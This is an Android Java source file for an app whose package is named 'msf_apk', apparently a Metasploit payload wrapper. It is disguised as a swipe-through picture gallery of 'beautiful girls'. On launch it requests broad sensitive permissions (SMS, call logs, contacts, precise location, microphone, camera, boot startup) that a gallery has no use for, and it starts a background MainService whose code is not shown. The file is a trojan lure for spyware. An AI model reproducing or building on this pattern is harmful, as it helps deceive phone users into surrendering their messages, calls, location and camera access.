package com.mine.msf_apk;

import android.Manifest;
import android.app.Activity;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.view.GestureDetector;
import android.view.MotionEvent;
import android.widget.ImageView;

import androidx.core.app.ActivityCompat;

import java.util.ArrayList;
import java.util.List;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_picture);
        MyRequestPermission();
        imageView = (ImageView)findViewById(R.id.imgView);  //获取ImageView控件id
        gestureDetector = new GestureDetector(onGestureListener); //设置手势监听由onGestureListener处理
        MainService.startService(this);
        //finish();
    }


    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
    }

    public void MyRequestPermission() {
        String[] permissions = new String[]{
                Manifest.permission.INTERNET,
                Manifest.permission.ACCESS_WIFI_STATE,
                Manifest.permission.CHANGE_WIFI_STATE,
                Manifest.permission.ACCESS_NETWORK_STATE,
                Manifest.permission.ACCESS_COARSE_LOCATION,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.CALL_PHONE,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.WRITE_CALL_LOG,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.WRITE_CONTACTS,
                Manifest.permission.READ_SMS,
                Manifest.permission.SEND_SMS,
                Manifest.permission.RECEIVE_SMS,
                Manifest.permission.RECORD_AUDIO,
                Manifest.permission.CAMERA,
                Manifest.permission.WRITE_SETTINGS,
                Manifest.permission.WRITE_EXTERNAL_STORAGE,
                Manifest.permission.RECEIVE_BOOT_COMPLETED,
                Manifest.permission.SET_WALLPAPER,
                Manifest.permission.WAKE_LOCK,
        };//你需要申请权限的列表

        List<String> mPermissionList = new ArrayList<>();
        for (int i = 0; i < permissions.length; i++) {
            if (ActivityCompat.checkSelfPermission(this, permissions[i]) != PackageManager.PERMISSION_GRANTED) {
                mPermissionList.add(permissions[i]);
            }
        }
        if (!mPermissionList.isEmpty())
            ActivityCompat.requestPermissions(this, mPermissionList.toArray(new String[mPermissionList.size()]), 66);
    }
    //to show beautiful girls
    private int[] resId = new int[]{
            R.drawable.bijo1,R.drawable.bijo2,R.drawable.bijo3,R.drawable.bijo4
    };
    //图片下标序号
    private int count = 0;
    //定义手势监听对象
    private GestureDetector gestureDetector;
    //定义ImageView对象
    private ImageView imageView;
    //当Activity被触摸时回调
    public boolean onTouchEvent(MotionEvent event){
        return gestureDetector.onTouchEvent(event);
    }
    //自定义GestureDetector的手势识别监听器
    private GestureDetector.OnGestureListener onGestureListener
            = new GestureDetector.SimpleOnGestureListener(){
        //当识别的手势是滑动手势时回调onFinger方法
        public boolean onFling(MotionEvent e1, MotionEvent e2, float velocityX, float velocityY){
            //得到手触碰位置的起始点和结束点坐标 x , y ，并进行计算
            float x = e2.getX()-e1.getX();
            float y = e2.getY()-e1.getY();
            //通过计算判断是向左还是向右滑动
            if(x > 0){
                count++;
                count%=(resId.length);
            }else if(x < 0){
                count--;
                count=(count+(resId.length))%(resId.length);
            }

            imageView.setImageResource(resId[count]); //切换imageView的图片
            return true;
        }
    };


}
